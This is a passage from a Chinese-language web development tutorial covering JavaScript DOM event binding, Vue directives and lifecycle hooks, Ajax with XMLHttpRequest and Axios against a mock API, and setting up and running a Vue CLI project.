获取元素-根据class属性获取</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// var divs = document.getElementsByClassName(&#x27;cls&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// for (let i = 0; i &lt; divs.length; i++) &#123;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//     alert(divs[i]);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//2. 查询参考手册, 属性、方法</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> divs = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&#x27;cls&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> div1 = divs[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    div1.<span class="property">innerHTML</span> = <span class="string">&quot;传智教育666&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="7-事件绑定"><a href="#7-事件绑定" class="headerlink" title="7).事件绑定"></a>7).事件绑定</h3><h4 id="方式1：通过html标签中的事件属性进行绑定"><a href="#方式1：通过html标签中的事件属性进行绑定" class="headerlink" title="方式1：通过html标签中的事件属性进行绑定"></a>方式1：通过html标签中的事件属性进行绑定</h4><p>例如一个按钮，我们对于按钮可以绑定单机事件，可以借助标签的onclick属性，属性值指向一个函数。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn1&quot;</span> <span class="attr">value</span>=<span class="string">&quot;事件绑定1&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;on()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>很明显没有on函数，所以我们需要创建该函数，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">on</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;按钮1被点击了...&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="方式2：通过DOM中Element元素的事件属性进行绑定"><a href="#方式2：通过DOM中Element元素的事件属性进行绑定" class="headerlink" title="方式2：通过DOM中Element元素的事件属性进行绑定"></a>方式2：通过DOM中Element元素的事件属性进行绑定</h4><p>依据我们学习过得DOM的知识点，我们知道html中的标签被加载成element对象，所以我们也可以通过element对象的属性来操作标签的属性。此时我们再次添加一个按钮，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;事件绑定2&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们可以先通过id属性获取按钮对象，然后操作对象的onclick属性来绑定事件，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;btn2&#x27;</span>).<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;按钮2被点击了...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="8-一些常见的事件"><a href="#8-一些常见的事件" class="headerlink" title="8).一些常见的事件"></a>8).一些常见的事件</h3><table>
<thead>
<tr>
<th>事件属性名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>onclick</td>
<td>鼠标单击事件</td>
</tr>
<tr>
<td>onblur</td>
<td>元素失去焦点</td>
</tr>
<tr>
<td>onfocus</td>
<td>元素获得焦点</td>
</tr>
<tr>
<td>onload</td>
<td>某个页面或图像被完成加载</td>
</tr>
<tr>
<td>onsubmit</td>
<td>当表单提交时触发该事件</td>
</tr>
<tr>
<td>onmouseover</td>
<td>鼠标被移到某元素之上</td>
</tr>
<tr>
<td>onmouseout</td>
<td>鼠标从某元素移开</td>
</tr>
</tbody></table>
<h2 id="4、vue的基本使用"><a href="#4、vue的基本使用" class="headerlink" title="4、vue的基本使用"></a>4、vue的基本使用</h2><h3 id="1、快速入门"><a href="#1、快速入门" class="headerlink" title="1、快速入门"></a>1、快速入门</h3><p>第一步：将vue.js下载拷贝到项目目录下</p>
<p>第二步：然后编写&lt;script&gt;标签来引入vue.js文件，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>第三步：在js代码区域定义vue对象,代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//定义Vue对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&quot;#app&quot;</span>, <span class="comment">//vue接管区域</span></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">message</span>: <span class="string">&quot;Hello Vue&quot;</span></span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在创建vue对象时，有几个常用的属性：</p>
<ul>
<li>el:  用来指定哪儿些标签受 Vue 管理。 该属性取值 <code>#app</code> 中的 <code>app</code> 需要是受管理的标签的id属性值</li>
<li>data: 用来定义数据模型</li>
<li>methods: 用来定义函数。这个我们在后面就会用到</li>
</ul>
<p>第四步：在html区域编写视图，其中双大括号是插值表达式，用来将vue对象中定义的model展示到页面上的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;message&quot;</span>&gt;</span></span><br><span class="line">        &#123;&#123;message&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>浏览器打开效果如图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/9485d513933405e6a210b4d9c55c3643--bbba--image-20231121195000984.png" alt="image-20231121195000984"></p>
<h3 id="2、vue指令"><a href="#2、vue指令" class="headerlink" title="2、vue指令"></a>2、vue指令</h3><table>
<thead>
<tr>
<th><strong>指令</strong></th>
<th><strong>作用</strong></th>
</tr>
</thead>
<tbody><tr>
<td><u><strong>v-bind</strong></u></td>
<td><u><strong>为HTML标签绑定属性值，如设置  href , css样式等</strong></u></td>
</tr>
<tr>
<td><u><strong>v-model</strong></u></td>
<td><u><strong>在表单元素上创建双向数据绑定</strong></u></td>
</tr>
<tr>
<td>v-on</td>
<td>为HTML标签绑定事件</td>
</tr>
<tr>
<td>v-if</td>
<td>条件性的渲染某元素，判定为true时渲染,否则不渲染</td>
</tr>
<tr>
<td>v-else</td>
<td></td>
</tr>
<tr>
<td>v-else-if</td>
<td></td>
</tr>
<tr>
<td>v-show</td>
<td>根据条件展示某元素，区别在于切换的是display属性的值</td>
</tr>
<tr>
<td>v-for</td>
<td>列表渲染，遍历容器的元素或者对象的属性</td>
</tr>
</tbody></table>
<h4 id="①v-bind"><a href="#①v-bind" class="headerlink" title="①v-bind:"></a>①v-bind:</h4><p>为HTML标签绑定属性值，如设置  href , css样式等。当vue对象中的数据模型发生变化时，标签的属性值会随之发生变化。</p>
<h4 id="②v-model："><a href="#②v-model：" class="headerlink" title="②v-model："></a>②v-model：</h4><p>在表单元素上创建双向数据绑定。什么是双向？</p>
<ul>
<li>vue对象的data属性中的数据变化，视图展示会一起变化</li>
<li>视图数据发生变化，vue对象的data属性中的数据也会随着变化。</li>
</ul>
<p>data属性中数据变化，我们知道可以通过赋值来改变，但是视图数据为什么会发生变化呢？<strong>只有表单项标签！所以双向绑定一定是使用在表单项标签上的</strong>。</p>
<p>接下来我们学习一下v-on指令。</p>
<h4 id="③v-on"><a href="#③v-on" class="headerlink" title="③v-on:"></a>③v-on:</h4><p>用来给html标签绑定事件的。<strong>需要注意的是如下2点</strong>：</p>
<ul>
<li><p>v-on语法给标签的事件绑定的函数，必须是vue对象种声明的函数</p>
</li>
<li><p>v-on语法绑定事件时，事件名相比较js中的事件名，没有on</p>
<p>例如：在js中，事件绑定demo函数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">&quot;demo()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>vue中，事件绑定demo函数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-on:click</span>=<span class="string">&quot;demo()&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="④v-if和v-show"><a href="#④v-if和v-show" class="headerlink" title="④v-if和v-show"></a>④v-if和v-show</h4><p>用于觉得是否展示</p>
<p>可以发现，浏览器呈现的效果是一样的，但是浏览器中html源码不一样。v-if指令，不满足条件的标签代码直接没了，而v-show指令中，不满足条件的代码依然存在，只是添加了css样式来控制标签不去显示。</p>
<h4 id="⑤v-for"><a href="#⑤v-for" class="headerlink" title="⑤v-for"></a>⑤v-for</h4><p>v-for: 从名字我们就能看出，这个指令是用来遍历的。其语法格式如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">标签</span> <span class="attr">v-for</span>=<span class="string">&quot;变量名 in 集合模型数据&quot;</span>&gt;</span></span><br><span class="line">    &#123;&#123;变量名&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">标签</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是：需要循环那个标签，v-for 指令就写在那个标签上。</p>
<p>有时我们遍历时需要使用索引，那么v-for指令遍历的语法格式如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">标签</span> <span class="attr">v-for</span>=<span class="string">&quot;(变量名,索引变量) in 集合模型数据&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--索引变量是从0开始，所以要表示序号的话，需要手动的加1--&gt;</span></span><br><span class="line">   &#123;&#123;索引变量 + 1&#125;&#125; &#123;&#123;变量名&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">标签</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="3、生命周期"><a href="#3、生命周期" class="headerlink" title="3、生命周期"></a>3、生命周期</h3><p>vue的生命周期：指的是vue对象从创建到销毁的过程。vue的生命周期包含8个阶段：每触发一个生命周期事件，会自动执行一个生命周期方法，这些生命周期方法也被称为钩子方法。其完整的生命周期如下图所示：</p>
<table>
<thead>
<tr>
<th>状态</th>
<th>阶段周期</th>
</tr>
</thead>
<tbody><tr>
<td>beforeCreate</td>
<td>创建前</td>
</tr>
<tr>
<td>created</td>
<td>创建后</td>
</tr>
<tr>
<td>beforeMount</td>
<td>挂载前</td>
</tr>
<tr>
<td>mounted</td>
<td>挂载完成</td>
</tr>
<tr>
<td>beforeUpdate</td>
<td>更新前</td>
</tr>
<tr>
<td>updated</td>
<td>更新后</td>
</tr>
<tr>
<td>beforeDestroy</td>
<td>销毁前</td>
</tr>
<tr>
<td>destroyed</td>
<td>销毁后</td>
</tr>
</tbody></table>
<p>下图是 Vue 官网提供的从创建 Vue 到效果 Vue 对象的整个过程及各个阶段对应的钩子函数：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-21/d3dd27cb2a5d10c6de0c00f4c9cf12fd--9b10--image-20231121195747907.png" alt="image-20231121195747907"></p>
<p>其中我们需要重点关注的是**mounted,**其他的我们了解即可。</p>
<p>mounted：挂载完成，Vue初始化成功，HTML页面渲染成功。<strong>以后我们一般用于页面初始化自动的ajax请求后台数据</strong></p>
<h2 id="5、Ajax的使用"><a href="#5、Ajax的使用" class="headerlink" title="5、Ajax的使用"></a>5、Ajax的使用</h2><h3 id="1、Ajax的介绍"><a href="#1、Ajax的介绍" class="headerlink" title="1、Ajax的介绍"></a>1、Ajax的介绍</h3><p>我们详细的解释一下Ajax技术的2个作用</p>
<ul>
<li><p>与服务器进行数据交互</p>
<p>如下图所示前端资源被浏览器解析，但是前端页面上缺少数据，前端可以通过Ajax技术，向后台服务器发起请求，后台服务器接受到前端的请求，从数据库中获取前端需要的资源，然后响应给前端，前端在通过我们学习的vue技术，可以将数据展示到页面上，这样用户就能看到完整的页面了。此处可以对比JavaSE中的网络编程技术来理解。</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/1478bd2c5b10db3902848da91ea311f7--5dc6--image-20231125221238816.png" alt="image-20231125221238816"></p>
<p>异步交互：可以在<strong>不重新加载整个页面</strong>的情况下，与服务器交换数据并<strong>更新部分网页</strong>的技术。</p>
<p>如下图所示，当我们再百度搜索java时，下面的联想数据是通过Ajax请求从后台服务器得到的，在整个过程中，我们的Ajax请求不会导致整个百度页面的重新加载，并且只针对搜索栏这局部模块的数据进行了数据的更新，不会对整个页面的其他地方进行数据的更新，这样就大大提升了页面的加载速度，用户体验高。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/9c8182429cd46012b107552c0eaa8f90--794e--image-20231125221257133.png" alt="image-20231125221257133"></p>
<p>这里也就再来讲下异步操作和同步操作的区别是什么。</p>
<p>同步请求发送过程如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/3eee530c76cba726b219ea41081ef642--233d--image-20231125221354077.png" alt="image-20231125221354077"></p>
<ul>
<li><p>浏览器页面在发送请求给服务器，在服务器处理请求的过程中，浏览器页面不能做其他的操作。只能等到服务器响应结束后才能，浏览器页面才能继续做其他的操作。 </p>
</li>
<li><p>异步请求发送过程如下图所示：</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/c577c087270747d00d18b684c2ebcca0--5447--image-20231125221404817.png" alt="image-20231125221404817"></p>
<ul>
<li>浏览器页面发送请求给服务器，在服务器处理请求的过程中，浏览器页面还可以做其他的操作。</li>
</ul>
<p>这样就能像百度搜索那样，未点击搜索但是仍然可以显示部分数据。</p>
<h3 id="2、Ajax的简单使用"><a href="#2、Ajax的简单使用" class="headerlink" title="2、Ajax的简单使用"></a>2、Ajax的简单使用</h3><ul>
<li><p>服务器端</p>
<p>因为我们暂时还没学过服务器端的代码，所以此处已经直接提供好了服务器端的请求地址，我们前端直接通过Ajax请求访问该地址即可。<strong>后台服务器地址</strong>：<a href="http://yapi.smart-xwork.cn/mock/169327/emp/list">http://yapi.smart-xwork.cn/mock/169327/emp/list</a></p>
<p>上述地址我们也可以直接通过浏览器来访问，访问结果如图所示：只截取部分数据</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/e3c78a9e3285d3b9c77530b3800ca1d1--4d72--image-20231125222034015.png" alt="image-20231125222034015"></p>
</li>
<li><p>客户端</p>
<p>客户端的Ajax请求代码如下有如下4步，接下来我们跟着步骤一起操作一下。</p>
<p>第一步：首先我们再VS Code中创建AJAX的文件夹，并且创建名为01. Ajax-原生方式.html的文件，提供如下代码，主要是按钮绑定单击事件，我们希望点击按钮，来发送ajax请求</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>原生Ajax<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;获取数据&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;getData()&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;div1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">     </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二步：创建XMLHttpRequest对象，用于和服务器交换数据，也是原生Ajax请求的核心对象，提供了各种方法。代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1. 创建XMLHttpRequest </span></span><br><span class="line"><span class="keyword">var</span> xmlHttpRequest  = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br></pre></td></tr></table></figure>

<p>第三步：调用对象的open()方法设置请求的参数信息，例如请求地址，请求方式。然后调用send()方法向服务器发送请求，代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//2. 发送异步请求</span></span><br><span class="line">xmlHttpRequest.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;http://yapi.smart-xwork.cn/mock/169327/emp/list&#x27;</span>);</span><br><span class="line">xmlHttpRequest.<span class="title function_">send</span>();<span class="comment">//发送请求</span></span><br></pre></td></tr></table></figure>

<p>第四步：我们通过绑定事件的方式，来获取服务器响应的数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//3. 获取服务响应数据</span></span><br><span class="line">xmlHttpRequest.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//此处判断 4表示浏览器已经完全接受到Ajax请求得到的响应， 200表示这是一个正确的Http请求，没有错误</span></span><br><span class="line">    <span class="keyword">if</span>(xmlHttpRequest.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xmlHttpRequest.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;div1&#x27;</span>).<span class="property">innerHTML</span> = xmlHttpRequest.<span class="property">responseText</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>最后我们通过浏览器打开页面，请求点击按钮，发送Ajax请求，最终显示结果如下图所示：</p>
<p> <img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/199862e599fc5422f4a52ec17821161c--1f36--image-20231125222026868.png" alt="image-20231125222026868"></p>
<p>并且通过浏览器的f12抓包，我们点击网络中的XHR请求，发现可以抓包到我们发送的Ajax请求。XHR代表的就是异步请求</p>
</li>
</ul>
<p>这些代码看起来也就是很复杂吧，很不方便去记忆，这个时候，Axios就因此诞生了。</p>
<h3 id="3、Axios"><a href="#3、Axios" class="headerlink" title="3、Axios"></a>3、Axios</h3><p>Axios的使用比较简单，主要分为2步：</p>
<ul>
<li><p>引入Axios文件</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/axios-0.18.0.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>使用Axios发送请求，并获取响应结果，官方提供的api很多，此处给出2种，如下</p>
<ul>
<li><p>发送 get 请求</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&quot;get&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;http://localhost:8080/ajax-demo1/aJAXDemo1?username=zhangsan&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">resp</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(resp.<span class="property">data</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>发送 post 请求</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&quot;http://localhost:8080/ajax-demo1/aJAXDemo1&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>:<span class="string">&quot;username=zhangsan&quot;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">resp</span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(resp.<span class="property">data</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
</ul>
<p>axios()是用来发送异步请求的，小括号中使用 js的JSON对象传递请求相关的参数：</p>
<ul>
<li>method属性：用来设置请求方式的。取值为 get 或者 post。</li>
<li>url属性：用来书写请求的资源路径。如果是 get 请求，需要将请求参数拼接到路径的后面，格式为： url?参数名&#x3D;参数值&amp;参数名2&#x3D;参数值2。</li>
<li>data属性：作为请求体被发送的数据。也就是说如果是 post 请求的话，数据需要作为 data 属性的值。</li>
</ul>
<p>then() 需要传递一个匿名函数。我们将 then()中传递的匿名函数称为 <strong>回调函数</strong>，意思是该匿名函数在发送请求时不会被调用，而是在成功响应后调用的函数。而该回调函数中的 resp 参数是对响应的数据进行封装的对象，通过 resp.data 可以获取到响应的数据。</p>
</li>
</ul>
<p>Axios还针对不同的请求，提供了别名方式的api,具体如下：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>axios.get(url [, config])</td>
<td>发送get请求</td>
</tr>
<tr>
<td>axios.delete(url [, config])</td>
<td>发送delete请求</td>
</tr>
<tr>
<td>axios.post(url [, data[, config]])</td>
<td>发送post请求</td>
</tr>
<tr>
<td>axios.put(url [, data[, config]])</td>
<td>发送put请求</td>
</tr>
</tbody></table>
<p>我们目前只关注get和post请求，所以在上述的入门案例中，我们可以将get请求代码改写成如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">axios.<span class="title function_">get</span>(<span class="string">&quot;http://yapi.smart-xwork.cn/mock/169327/emp/list&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>post请求改写成如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">axios.<span class="title function_">post</span>(<span class="string">&quot;http://yapi.smart-xwork.cn/mock/169327/emp/deleteById&quot;</span>,<span class="string">&quot;id=1&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(result.<span class="property">data</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="6、Vue的简单教程介绍"><a href="#6、Vue的简单教程介绍" class="headerlink" title="6、Vue的简单教程介绍"></a>6、Vue的简单教程介绍</h2><h3 id="1、项目创建"><a href="#1、项目创建" class="headerlink" title="1、项目创建"></a>1、项目创建</h3><p>环境准备好了，接下来我们需要通过Vue-cli创建一个vue项目，然后再学习一下vue项目的目录结构。Vue-cli提供了如下2种方式创建vue项目:</p>
<ul>
<li><p>命令行：直接通过命令行方式创建vue项目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vue create vue-project01</span><br></pre></td></tr></table></figure>


</li>
<li><p>图形化界面：通过命令先进入到图形化界面，然后再进行vue工程的创建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vue ui</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2、项目结构的简单分析"><a href="#2、项目结构的简单分析" class="headerlink" title="2、项目结构的简单分析"></a>2、项目结构的简单分析</h3><p>我们通过VS Code打开之前创建的vue文件夹，打开之后，呈现如下图所示页面：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/a84df0d25fc9623cd84a8136751af782--7c96--image-20231125224706489.png" alt="image-20231125224706489"></p>
<p>vue项目的标准目录结构以及目录对应的解释如下图所示:</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/5cc1aec4f35e31988a0864b2586a0c5e--5409--image-20231125224714378.png" alt="image-20231125224714378"></p>
<p>其中我们平时开发代码就是在<strong>src目录</strong>下	</p>
<h3 id="3、Vue项目的运行"><a href="#3、Vue项目的运行" class="headerlink" title="3、Vue项目的运行"></a>3、Vue项目的运行</h3><p>那么vue项目开发好了，我们应该怎么运行vue项目呢？主要提供了2种方式</p>
<ul>
<li>第一种方式：通过VS Code提供的图形化界面 ，如下图所示：（注意：NPM脚本窗口默认不显示，可以参考本节的最后调试出来）</li>
</ul>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/c06bda53d80150fc54aea584a377c7d0--c078--image-20231125225846123.png" alt="image-20231125225846123"></p>
<p>点击之后，我们等待片刻，即可运行，在终端界面中，我们发现项目是运行在本地服务的8080端口，我们直接通过浏览器打开地址</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/f1f262284f1a4dd41228e35f1ecf52e8--3933--image-20231125225858533.png" alt="image-20231125225858533"></p>
<p>最终浏览器打开后，呈现如下界面，表示项目运行成功</p>
<p><img src="http://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/c7ec1f87086087633a3fc5e245fdc31a--d81e--image-20231125225912576.png" alt="image-20231125225912576"></p>
<p>其实此时访问的是 <strong>src&#x2F;App.vue</strong>这个根组件，此时我们打开这个组件，修改代码：添加内容Vue</p>
<p>只要我们保存更新的代码，我们直接打开浏览器，不需要做任何刷新，发现页面呈现内容发生了变化，如下图所示：</p>
<p>这就是我们vue项目的热更新功能 </p>
<p>对于8080端口，经常被占用，所以我们可以去修改默认的8080端口。我们修改vue.config.js文件的内容，添加如下代码：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">devServer<span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">    port<span class="punctuation">:</span><span class="number">7000</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>第二种方式：命令行方式</p>
<p>直接基于cmd命令窗口，在vue目录下，执行输入命令<code>npm run serve</code>即可，如下图所示：</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-25/65f26040c8e0cf8668a0e615a8a223ea--ef9c--image-20231125230802565.png" alt="image-20231125230802565"></p>
